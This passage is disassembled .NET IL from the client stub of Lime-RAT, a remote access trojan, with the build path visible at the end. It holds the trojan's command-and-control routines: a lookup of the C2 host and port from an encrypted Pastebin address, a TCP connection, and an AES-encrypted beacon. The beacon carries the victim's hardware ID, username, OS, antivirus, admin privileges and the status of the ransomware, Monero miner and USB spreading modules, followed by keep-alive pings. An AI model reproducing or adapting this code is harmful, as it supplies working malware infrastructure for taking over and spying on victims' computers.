    .locals init (object V_0,
             class [mscorlib]System.Exception V_1,
             class [mscorlib]System.Exception V_2,
             class [mscorlib]System.Exception V_3,
             class [mscorlib]System.Threading.TimerCallback V_4,
             class [System]System.Net.WebClient V_5,
             class [System]System.Net.NetworkCredential V_6,
             string[] V_7,
             class [mscorlib]System.Exception V_8,
             bool V_9,
             class [mscorlib]System.Exception V_10)
    IL_0000:  ldc.i4.0
    IL_0001:  stsfld     bool Client.Lime.C_TcpClient::isConnected
    .try
    {
      IL_0006:  ldsfld     class [System]System.Net.Sockets.TcpClient Client.Lime.C_TcpClient::C
      IL_000b:  callvirt   instance void [System]System.Net.Sockets.TcpClient::Close()
      IL_0010:  leave.s    IL_0020

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0012:  dup
      IL_0013:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0018:  stloc.1
      IL_0019:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_001e:  leave.s    IL_0020

    }  // end handler
    IL_0020:  nop
    .try
    {
      IL_0021:  ldsfld     class [mscorlib]System.Threading.Timer Client.Lime.C_TcpClient::Tick
      IL_0026:  callvirt   instance void [mscorlib]System.Threading.Timer::Dispose()
      IL_002b:  leave.s    IL_003b

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_002d:  dup
      IL_002e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0033:  stloc.2
      IL_0034:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0039:  leave.s    IL_003b

    }  // end handler
    IL_003b:  nop
    .try
    {
      IL_003c:  ldsfld     class [mscorlib]System.IO.MemoryStream Client.Lime.C_TcpClient::MS
      IL_0041:  callvirt   instance void [mscorlib]System.IO.Stream::Dispose()
      IL_0046:  leave.s    IL_0056

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0048:  dup
      IL_0049:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_004e:  stloc.3
      IL_004f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0054:  leave.s    IL_0056

    }  // end handler
    IL_0056:  nop
    .try
    {
      IL_0057:  newobj     instance void [System]System.Net.Sockets.TcpClient::.ctor()
      IL_005c:  stsfld     class [System]System.Net.Sockets.TcpClient Client.Lime.C_TcpClient::C
      IL_0061:  ldsfld     class [System]System.Net.Sockets.TcpClient Client.Lime.C_TcpClient::C
      IL_0066:  ldc.i4     0x4e2000
      IL_006b:  callvirt   instance void [System]System.Net.Sockets.TcpClient::set_ReceiveBufferSize(int32)
      IL_0070:  ldsfld     class [System]System.Net.Sockets.TcpClient Client.Lime.C_TcpClient::C
      IL_0075:  ldc.i4     0x4e2000
      IL_007a:  callvirt   instance void [System]System.Net.Sockets.TcpClient::set_SendBufferSize(int32)
      IL_007f:  ldsfld     class [System]System.Net.Sockets.TcpClient Client.Lime.C_TcpClient::C
      IL_0084:  ldc.i4.m1
      IL_0085:  callvirt   instance void [System]System.Net.Sockets.TcpClient::set_ReceiveTimeout(int32)
      IL_008a:  ldsfld     class [System]System.Net.Sockets.TcpClient Client.Lime.C_TcpClient::C
      IL_008f:  ldc.i4.m1
      IL_0090:  callvirt   instance void [System]System.Net.Sockets.TcpClient::set_SendTimeout(int32)
      IL_0095:  newobj     instance void [System]System.Net.WebClient::.ctor()
      IL_009a:  stloc.s    V_5
      .try
      {
        .try
        {
          IL_009c:  ldstr      ""
          IL_00a1:  ldstr      ""
          IL_00a6:  newobj     instance void [System]System.Net.NetworkCredential::.ctor(string,
                                                                                         string)
          IL_00ab:  stloc.s    V_6
          IL_00ad:  ldloc.s    V_5
          IL_00af:  ldloc.s    V_6
          IL_00b1:  callvirt   instance void [System]System.Net.WebClient::set_Credentials(class [System]System.Net.ICredentials)
          IL_00b6:  ldloc.s    V_5
          IL_00b8:  ldnull
          IL_00b9:  ldstr      "DownloadString"
          IL_00be:  ldc.i4.1
          IL_00bf:  newarr     [mscorlib]System.Object
          IL_00c4:  dup
          IL_00c5:  ldc.i4.0
          IL_00c6:  ldsfld     string Client.Lime.C_Settings::Pastebin
          IL_00cb:  call       object Client.Lime.C_Encryption::AES_Decrypt(string)
          IL_00d0:  stelem.ref
          IL_00d1:  ldnull
          IL_00d2:  ldnull
          IL_00d3:  ldnull
          IL_00d4:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateGet(object,
                                                                                                                            class [mscorlib]System.Type,
                                                                                                                            string,
                                                                                                                            object[],
                                                                                                                            string[],
                                                                                                                            class [mscorlib]System.Type[],
                                                                                                                            bool[])
          IL_00d9:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
          IL_00de:  ldstr      ":"
          IL_00e3:  ldc.i4.m1
          IL_00e4:  ldc.i4.0
          IL_00e5:  call       string[] [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::Split(string,
                                                                                                    string,
                                                                                                    int32,
                                                                                                    valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.CompareMethod)
          IL_00ea:  stloc.s    V_7
          IL_00ec:  ldloc.s    V_7
          IL_00ee:  ldc.i4.0
          IL_00ef:  ldelem.ref
          IL_00f0:  stsfld     string Client.Lime.C_Settings::HOST
          IL_00f5:  newobj     instance void [mscorlib]System.Random::.ctor()
          IL_00fa:  pop
          IL_00fb:  ldloc.s    V_7
          IL_00fd:  newobj     instance void [mscorlib]System.Random::.ctor()
          IL_0102:  ldc.i4.1
          IL_0103:  ldloc.s    V_7
          IL_0105:  ldlen
          IL_0106:  conv.i4
          IL_0107:  callvirt   instance int32 [mscorlib]System.Random::Next(int32,
                                                                            int32)
          IL_010c:  ldelem.ref
          IL_010d:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToInteger(string)
          IL_0112:  stsfld     int32 Client.Lime.C_Settings::PORT
          IL_0117:  ldloc.s    V_5
          IL_0119:  callvirt   instance void [System]System.ComponentModel.Component::Dispose()
          IL_011e:  leave.s    IL_012f

        }  // end .try
        catch [mscorlib]System.Exception 
        {
          IL_0120:  dup
          IL_0121:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
          IL_0126:  stloc.s    V_8
          IL_0128:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
          IL_012d:  leave.s    IL_012f

        }  // end handler
        IL_012f:  leave.s    IL_013d

      }  // end .try
      finally
      {
        IL_0131:  ldloc.s    V_5
        IL_0133:  brfalse.s  IL_013c

        IL_0135:  ldloc.s    V_5
        IL_0137:  callvirt   instance void [mscorlib]System.IDisposable::Dispose()
        IL_013c:  endfinally
      }  // end handler
      IL_013d:  ldsfld     class [System]System.Net.Sockets.TcpClient Client.Lime.C_TcpClient::C
      IL_0142:  ldsfld     string Client.Lime.C_Settings::HOST
      IL_0147:  ldsfld     int32 Client.Lime.C_Settings::PORT
      IL_014c:  callvirt   instance void [System]System.Net.Sockets.TcpClient::Connect(string,
                                                                                       int32)
      IL_0151:  ldc.i4.1
      IL_0152:  stsfld     bool Client.Lime.C_TcpClient::isConnected
      IL_0157:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
      IL_015c:  stsfld     class [mscorlib]System.IO.MemoryStream Client.Lime.C_TcpClient::MS
      IL_0161:  ldc.i4.s   33
      IL_0163:  newarr     [mscorlib]System.Object
      IL_0168:  dup
      IL_0169:  ldc.i4.0
      IL_016a:  ldstr      "info"
      IL_016f:  stelem.ref
      IL_0170:  dup
      IL_0171:  ldc.i4.1
      IL_0172:  ldsfld     string Client.Lime.C_TcpClient::SPL
      IL_0177:  stelem.ref
      IL_0178:  dup
      IL_0179:  ldc.i4.2
      IL_017a:  call       string Client.Lime.C_ID::HWID()
      IL_017f:  stelem.ref
      IL_0180:  dup
      IL_0181:  ldc.i4.3
      IL_0182:  ldsfld     string Client.Lime.C_TcpClient::SPL
      IL_0187:  stelem.ref
      IL_0188:  dup
      IL_0189:  ldc.i4.4
      IL_018a:  call       object Client.Lime.C_ID::UserName()
      IL_018f:  stelem.ref
      IL_0190:  dup
      IL_0191:  ldc.i4.5
      IL_0192:  ldsfld     string Client.Lime.C_TcpClient::SPL
      IL_0197:  stelem.ref
      IL_0198:  dup
      IL_0199:  ldc.i4.6
      IL_019a:  ldstr      "v0.1.9.2"
      IL_019f:  stelem.ref
      IL_01a0:  dup
      IL_01a1:  ldc.i4.7
      IL_01a2:  ldsfld     string Client.Lime.C_TcpClient::SPL
      IL_01a7:  stelem.ref
      IL_01a8:  dup
      IL_01a9:  ldc.i4.8
      IL_01aa:  call       object Client.Lime.C_ID::MyOS()
      IL_01af:  stelem.ref
      IL_01b0:  dup
      IL_01b1:  ldc.i4.s   9
      IL_01b3:  ldstr      " "
      IL_01b8:  stelem.ref
      IL_01b9:  dup
      IL_01ba:  ldc.i4.s   10
      IL_01bc:  call       object Client.Lime.C_ID::Bit()
      IL_01c1:  stelem.ref
      IL_01c2:  dup
      IL_01c3:  ldc.i4.s   11
      IL_01c5:  ldsfld     string Client.Lime.C_TcpClient::SPL
      IL_01ca:  stelem.ref
      IL_01cb:  dup
      IL_01cc:  ldc.i4.s   12
      IL_01ce:  call       string Client.Lime.C_ID::INDATE()
      IL_01d3:  stelem.ref
      IL_01d4:  dup
      IL_01d5:  ldc.i4.s   13
      IL_01d7:  ldsfld     string Client.Lime.C_TcpClient::SPL
      IL_01dc:  stelem.ref
      IL_01dd:  dup
      IL_01de:  ldc.i4.s   14
      IL_01e0:  call       string Client.Lime.C_ID::AV()
      IL_01e5:  stelem.ref
      IL_01e6:  dup
      IL_01e7:  ldc.i4.s   15
      IL_01e9:  ldsfld     string Client.Lime.C_TcpClient::SPL
      IL_01ee:  stelem.ref
      IL_01ef:  dup
      IL_01f0:  ldc.i4.s   16
      IL_01f2:  call       object Client.Lime.C_ID::Rans()
      IL_01f7:  stelem.ref
      IL_01f8:  dup
      IL_01f9:  ldc.i4.s   17
      IL_01fb:  ldsfld     string Client.Lime.C_TcpClient::SPL
      IL_0200:  stelem.ref
      IL_0201:  dup
      IL_0202:  ldc.i4.s   18
      IL_0204:  call       string Client.Lime.C_ID::XMR()
      IL_0209:  stelem.ref
      IL_020a:  dup
      IL_020b:  ldc.i4.s   19
      IL_020d:  ldsfld     string Client.Lime.C_TcpClient::SPL
      IL_0212:  stelem.ref
      IL_0213:  dup
      IL_0214:  ldc.i4.s   20
      IL_0216:  call       object Client.Lime.C_ID::USBSP()
      IL_021b:  stelem.ref
      IL_021c:  dup
      IL_021d:  ldc.i4.s   21
      IL_021f:  ldsfld     string Client.Lime.C_TcpClient::SPL
      IL_0224:  stelem.ref
      IL_0225:  dup
      IL_0226:  ldc.i4.s   22
      IL_0228:  ldsfld     int32 Client.Lime.C_Settings::PORT
      IL_022d:  box        [mscorlib]System.Int32
      IL_0232:  stelem.ref
      IL_0233:  dup
      IL_0234:  ldc.i4.s   23
      IL_0236:  ldsfld     string Client.Lime.C_TcpClient::SPL
      IL_023b:  stelem.ref
      IL_023c:  dup
      IL_023d:  ldc.i4.s   24
      IL_023f:  call       string Client.Lime.C_ID::dotNET()
      IL_0244:  stelem.ref
      IL_0245:  dup
      IL_0246:  ldc.i4.s   25
      IL_0248:  ldsfld     string Client.Lime.C_TcpClient::SPL
      IL_024d:  stelem.ref
      IL_024e:  dup
      IL_024f:  ldc.i4.s   26
      IL_0251:  ldstr      "..."
      IL_0256:  stelem.ref
      IL_0257:  dup
      IL_0258:  ldc.i4.s   27
      IL_025a:  ldsfld     string Client.Lime.C_TcpClient::SPL
      IL_025f:  stelem.ref
      IL_0260:  dup
      IL_0261:  ldc.i4.s   28
      IL_0263:  ldstr      " "
      IL_0268:  stelem.ref
      IL_0269:  dup
      IL_026a:  ldc.i4.s   29
      IL_026c:  ldsfld     string Client.Lime.C_TcpClient::SPL
      IL_0271:  stelem.ref
      IL_0272:  dup
      IL_0273:  ldc.i4.s   30
      IL_0275:  call       bool Client.Lime.C_ID::Privileges()
      IL_027a:  stloc.s    V_9
      IL_027c:  ldloca.s   V_9
      IL_027e:  call       instance string [mscorlib]System.Boolean::ToString()
      IL_0283:  stelem.ref
      IL_0284:  dup
      IL_0285:  ldc.i4.s   31
      IL_0287:  ldsfld     string Client.Lime.C_TcpClient::SPL
      IL_028c:  stelem.ref
      IL_028d:  dup
      IL_028e:  ldc.i4.s   32
      IL_0290:  ldsfld     object Client.Lime.C_Settings::fullpath
      IL_0295:  stelem.ref
      IL_0296:  call       string [mscorlib]System.String::Concat(object[])
      IL_029b:  call       void Client.Lime.C_TcpClient::Send(string)
      IL_02a0:  ldsfld     class [mscorlib]System.Threading.TimerCallback Client.Lime.C_TcpClient/_Closure$__::'$IR13-2'
      IL_02a5:  brfalse.s  IL_02ae

      IL_02a7:  ldsfld     class [mscorlib]System.Threading.TimerCallback Client.Lime.C_TcpClient/_Closure$__::'$IR13-2'
      IL_02ac:  br.s       IL_02c4

      IL_02ae:  ldsfld     class Client.Lime.C_TcpClient/_Closure$__ Client.Lime.C_TcpClient/_Closure$__::$I
      IL_02b3:  ldftn      instance void Client.Lime.C_TcpClient/_Closure$__::'_Lambda$__R13-2'(object)
      IL_02b9:  newobj     instance void [mscorlib]System.Threading.TimerCallback::.ctor(object,
                                                                                         native int)
      IL_02be:  dup
      IL_02bf:  stsfld     class [mscorlib]System.Threading.TimerCallback Client.Lime.C_TcpClient/_Closure$__::'$IR13-2'
      IL_02c4:  stloc.s    V_4
      IL_02c6:  ldloc.s    V_4
      IL_02c8:  ldnull
      IL_02c9:  ldc.i4.0
      IL_02ca:  ldc.i4.1
      IL_02cb:  newobj     instance void [mscorlib]System.Threading.Timer::.ctor(class [mscorlib]System.Threading.TimerCallback,
                                                                                 object,
                                                                                 int32,
                                                                                 int32)
      IL_02d0:  stsfld     class [mscorlib]System.Threading.Timer Client.Lime.C_TcpClient::Tick
      IL_02d5:  ldsfld     bool Client.Lime.C_TcpClient::isConnected
      IL_02da:  box        [mscorlib]System.Boolean
      IL_02df:  stloc.0
      IL_02e0:  leave.s    IL_02fc

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_02e2:  dup
      IL_02e3:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_02e8:  stloc.s    V_10
      IL_02ea:  ldsfld     bool Client.Lime.C_TcpClient::isConnected
      IL_02ef:  box        [mscorlib]System.Boolean
      IL_02f4:  stloc.0
      IL_02f5:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_02fa:  leave.s    IL_02fc

    }  // end handler
    IL_02fc:  ldloc.0
    IL_02fd:  ret
  } // end of method C_TcpClient::ReConnect

  .method public static void  SendData(uint8[] b) cil managed
  {
    // Code size       143 (0x8f)
    .maxstack  5
    .locals init (class [mscorlib]System.IO.MemoryStream V_0,
             object V_1,
             class [mscorlib]System.Exception V_2)
    IL_0000:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
    IL_0005:  stloc.0
    .try
    {
      IL_0006:  ldloc.0
      IL_0007:  ldarg.0
      IL_0008:  ldc.i4.0
      IL_0009:  ldarg.0
      IL_000a:  ldlen
      IL_000b:  conv.i4
      IL_000c:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                 int32,
                                                                                 int32)
      IL_0011:  ldloc.0
      IL_0012:  ldsfld     string Client.Lime.C_TcpClient::ENDOF
      IL_0017:  call       uint8[] Client.Lime.C_Fuctions::SB(string)
      IL_001c:  ldc.i4.0
      IL_001d:  ldsfld     string Client.Lime.C_TcpClient::ENDOF
      IL_0022:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_0027:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                 int32,
                                                                                 int32)
      IL_002c:  ldsfld     class [System]System.Net.Sockets.TcpClient Client.Lime.C_TcpClient::C
      IL_0031:  stloc.1
      IL_0032:  ldloc.1
      IL_0033:  call       void [mscorlib]System.Threading.Monitor::Enter(object)
      .try
      {
        IL_0038:  ldsfld     class [System]System.Net.Sockets.TcpClient Client.Lime.C_TcpClient::C
        IL_003d:  callvirt   instance class [System]System.Net.Sockets.Socket [System]System.Net.Sockets.TcpClient::get_Client()
        IL_0042:  ldc.i4.m1
        IL_0043:  ldc.i4.1
        IL_0044:  callvirt   instance bool [System]System.Net.Sockets.Socket::Poll(int32,
                                                                                   valuetype [System]System.Net.Sockets.SelectMode)
        IL_0049:  pop
        IL_004a:  ldsfld     class [System]System.Net.Sockets.TcpClient Client.Lime.C_TcpClient::C
        IL_004f:  callvirt   instance class [System]System.Net.Sockets.Socket [System]System.Net.Sockets.TcpClient::get_Client()
        IL_0054:  ldloc.0
        IL_0055:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
        IL_005a:  ldc.i4.0
        IL_005b:  ldloc.0
        IL_005c:  callvirt   instance int64 [mscorlib]System.IO.MemoryStream::get_Length()
        IL_0061:  conv.ovf.i4
        IL_0062:  ldc.i4.0
        IL_0063:  callvirt   instance int32 [System]System.Net.Sockets.Socket::Send(uint8[],
                                                                                    int32,
                                                                                    int32,
                                                                                    valuetype [System]System.Net.Sockets.SocketFlags)
        IL_0068:  pop
        IL_0069:  leave.s    IL_0072

      }  // end .try
      finally
      {
        IL_006b:  ldloc.1
        IL_006c:  call       void [mscorlib]System.Threading.Monitor::Exit(object)
        IL_0071:  endfinally
      }  // end handler
      IL_0072:  ldloc.0
      IL_0073:  callvirt   instance void [mscorlib]System.IO.Stream::Dispose()
      IL_0078:  leave.s    IL_008e

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_007a:  dup
      IL_007b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0080:  stloc.2
      IL_0081:  ldc.i4.0
      IL_0082:  stsfld     bool Client.Lime.C_TcpClient::isConnected
      IL_0087:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_008c:  leave.s    IL_008e

    }  // end handler
    IL_008e:  ret
  } // end of method C_TcpClient::SendData

  .method public static void  Send(string S) cil managed
  {
    // Code size       22 (0x16)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       object Client.Lime.C_Encryption::AES_Encrypt(string)
    IL_0006:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
    IL_000b:  call       uint8[] Client.Lime.C_Fuctions::SB(string)
    IL_0010:  call       void Client.Lime.C_TcpClient::SendData(uint8[])
    IL_0015:  ret
  } // end of method C_TcpClient::Send

  .method public static void  PING() cil managed
  {
    // Code size       129 (0x81)
    .maxstack  3
    .try
    {
      IL_0000:  ldsfld     bool Client.Lime.C_TcpClient::P_Start
      IL_0005:  brfalse.s  IL_0013

      IL_0007:  ldsfld     int32 Client.Lime.C_TcpClient::i
      IL_000c:  ldc.i4.1
      IL_000d:  add.ovf
      IL_000e:  stsfld     int32 Client.Lime.C_TcpClient::i
      IL_0013:  ldsfld     bool Client.Lime.C_TcpClient::P_Stop
      IL_0018:  brfalse.s  IL_004a

      IL_001a:  ldc.i4.0
      IL_001b:  stsfld     bool Client.Lime.C_TcpClient::P_Start
      IL_0020:  ldc.i4.0
      IL_0021:  stsfld     bool Client.Lime.C_TcpClient::P_Stop
      IL_0026:  ldstr      "!P"
      IL_002b:  ldsfld     string Client.Lime.C_TcpClient::SPL
      IL_0030:  ldsflda    int32 Client.Lime.C_TcpClient::i
      IL_0035:  call       instance string [mscorlib]System.Int32::ToString()
      IL_003a:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_003f:  call       void Client.Lime.C_TcpClient::Send(string)
      IL_0044:  ldc.i4.0
      IL_0045:  stsfld     int32 Client.Lime.C_TcpClient::i
      IL_004a:  ldsfld     int32 Client.Lime.C_TcpClient::KAP
      IL_004f:  ldc.i4.1
      IL_0050:  add.ovf
      IL_0051:  stsfld     int32 Client.Lime.C_TcpClient::KAP
      IL_0056:  ldsfld     int32 Client.Lime.C_TcpClient::KAP
      IL_005b:  ldc.i4     0x1388
      IL_0060:  ble.s      IL_0072

      IL_0062:  ldc.i4.0
      IL_0063:  stsfld     int32 Client.Lime.C_TcpClient::KAP
      IL_0068:  ldstr      "KA"
      IL_006d:  call       void Client.Lime.C_TcpClient::Send(string)
      IL_0072:  leave.s    IL_0080

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0074:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0079:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_007e:  leave.s    IL_0080

    }  // end handler
    IL_0080:  ret
  } // end of method C_TcpClient::PING

} // end of class Client.Lime.C_TcpClient


// =============================================================

// *********** DISASSEMBLY COMPLETE ***********************
// WARNING: Created Win32 resource file C:\Users\NC\Documents\GitHub\Lime-RAT\Project\_EXE\Release\Misc\Stub\Stub.res
